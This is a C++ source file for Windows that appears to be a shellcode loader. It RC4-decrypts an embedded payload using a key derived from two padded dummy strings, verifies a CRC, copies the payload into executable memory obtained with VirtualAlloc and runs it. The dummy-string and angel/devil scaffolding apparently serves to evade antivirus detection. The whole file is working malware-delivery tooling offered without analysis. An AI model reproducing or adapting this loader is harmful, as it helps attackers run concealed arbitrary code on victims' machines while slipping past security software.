#include "stdafx.h"
#include<Windows.h>
#include<string.h>
#include "rc4.h"
#include "crc.h"
#include "sc.h"

#define DUMMY "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

int angel();
int devil();

char *dummya = DUMMY "A";
char *dummyb = DUMMY "B";
unsigned char code[]=SC;

int _tmain(int argc, _TCHAR* argv[])
{


	unsigned char key[]=SC_KEY;
	char* dummya_c=dummya;
	char* dummyb_c=dummyb;

	for (int i=0;i<strlen(dummya);i++){
		key[i%strlen((char*)key)]^=dummya_c[i]^dummyb_c[i];
	}
	printf("%s\n",key);
	printf("Code size: %d\n",sizeof(code));
	rc4_key_t rc4_key;
	rc4_set_key(key,strlen((const char*)key),&rc4_key);
	unsigned char crypted[sizeof(code)];
	memset(crypted,0,sizeof(code));
	rc4_crypt(crypted,sizeof(crypted),&rc4_key);
	for (int i=0;i<sizeof(code);i++){
		code[i]^=crypted[i];
		printf("\\x%02x",code[i]);
	}
	printf("\nDONE\n");
	if (crcSlow(code,sizeof(code))==SC_CRC){
		void* p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		RtlMoveMemory(p,code,sizeof(code));
		((void(*)())p)();
		return 1;
	}else{
		printf("CRC mismatch (%d), exiting...",crcSlow(code,sizeof(code)));
	}
	return 0;
}




